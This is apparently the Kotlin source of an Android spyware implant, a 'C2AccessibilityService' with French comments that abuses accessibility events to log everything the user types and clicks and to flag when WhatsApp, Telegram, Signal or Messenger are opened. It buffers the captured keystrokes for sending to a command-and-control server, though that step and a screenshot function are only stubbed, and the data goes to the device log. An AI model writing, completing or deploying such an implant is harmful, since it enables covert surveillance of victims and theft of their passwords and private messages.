package com.c2.implant

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayOutputStream
import java.lang.reflect.Method

class C2AccessibilityService : AccessibilityService() {

    private var keylogBuffer = StringBuilder()
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        var instance: C2AccessibilityService? = null
    }

    override fun onServiceConnected() {
        instance = this
        super.onServiceConnected()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // Keylogging
                val text = event.text?.joinToString("") ?: ""
                if (text.isNotEmpty()) {
                    keylogBuffer.append(text)
                    if (keylogBuffer.length > 1000) {
                        flushKeylog()
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // Enregistrer les clics
                val source = event.source
                source?.let { node ->
                    val text = node.text ?: node.contentDescription ?: ""
                    if (text.isNotEmpty()) {
                        keylogBuffer.append("[CLICK:$text] ")
                    }
                }
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Détecter les apps ouvertes
                val packageName = event.packageName ?: ""
                if (packageName.contains("whatsapp") || packageName.contains("telegram") ||
                    packageName.contains("signal") || packageName.contains("messenger")) {
                    // Notifier le C2
                    log("App détectée : $packageName")
                }
            }
        }
    }

    private fun flushKeylog() {
        if (keylogBuffer.isEmpty()) return
        val data = keylogBuffer.toString()
        keylogBuffer.clear()
        // Envoyer au C2
        log("[KEYLOG] $data")
    }

    fun takeScreenshot(): ByteArray? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // Android 11+ : prendre un screenshot
                val method = this::class.java.getMethod("takeScreenshot")
                // Réflexion pour appeler l'API interne
                null // Simplifié
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    override fun onInterrupt() {}

    private fun log(msg: String) {
        android.util.Log.d("C2_ACCESSIBILITY", msg)
    }
}
